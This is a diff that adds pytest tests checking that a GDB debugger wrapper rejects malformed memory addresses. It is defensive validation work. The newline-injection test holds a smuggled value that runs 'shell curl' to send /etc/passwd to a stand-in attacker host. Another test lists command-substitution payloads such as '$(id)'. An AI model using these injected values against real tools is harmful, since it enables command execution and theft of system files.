@@ -79,6 +79,65 @@ class TestDebuggerNoPathInjection:
             assert "<" not in line, f"Script contains redirect: {line}"
 
 
+class TestExamineMemoryAddressValidation:
+    """Verify examine_memory() rejects addresses that would inject GDB commands.
+
+    Yeah, not a live exploit path. CrashAnalyser validates addresses before they
+    get here, GDB runs as the same user, and nothing currently passes untrusted
+    input to this method. It's a public export though, so we do this correctly.
+    """
+
+    @pytest.fixture
+    def debugger(self, tmp_path):
+        from packages.binary_analysis.debugger import GDBDebugger
+        binary = tmp_path / "test_binary"
+        binary.write_text("fake")
+        return GDBDebugger(binary)
+
+    def test_valid_address_accepted(self, debugger, tmp_path):
+        """Well-formed hex addresses must work."""
+        input_file = tmp_path / "crash.bin"
+        input_file.write_text("data")
+        # Should not raise; patch subprocess to avoid actually running GDB
+        from unittest.mock import patch, MagicMock
+        with patch("subprocess.run", return_value=MagicMock(stdout="", returncode=0)):
+            debugger.examine_memory(input_file, "0xdeadbeef")
+            debugger.examine_memory(input_file, "0x0")
+            debugger.examine_memory(input_file, "0xDEADBEEF")
+            debugger.examine_memory(input_file, "0x7fff5fbff000")
+
+    def test_newline_injection_rejected(self, debugger, tmp_path):
+        """
+        A newline in address would let an attacker inject a second GDB command.
+
+        Example: address = "0x1234\\nshell curl -d @/etc/passwd attacker.example"
+        Without validation this produces a GDB script line:
+            x/64xb 0x1234
+            shell curl -d @/etc/passwd attacker.example
+        GDB's `shell` command executes the rest as an OS command.
+        """
+        input_file = tmp_path / "crash.bin"
+        input_file.write_text("data")
+        malicious = "0x1234\nshell curl -d @/etc/passwd attacker.example"
+        with pytest.raises(ValueError, match="Invalid address"):
+            debugger.examine_memory(input_file, malicious)
+
+    def test_semicolon_injection_rejected(self, debugger, tmp_path):
+        """Semicolons and other non-hex characters are rejected."""
+        input_file = tmp_path / "crash.bin"
+        input_file.write_text("data")
+        for bad in ["0x1234; shell id", "$(id)", "`id`", "0x1234 extra", ""]:
+            with pytest.raises(ValueError, match="Invalid address"):
+                debugger.examine_memory(input_file, bad)
+
+    def test_bare_integer_rejected(self, debugger, tmp_path):
+        """Decimal addresses (no 0x prefix) are rejected — 0x is required."""
+        input_file = tmp_path / "crash.bin"
+        input_file.write_text("data")
+        with pytest.raises(ValueError, match="Invalid address"):
+            debugger.examine_memory(input_file, "1234567890")
+
+
 class TestDebuggerTempFile:
     """Verify debugger.py uses random temp files and cleans them up."""
 
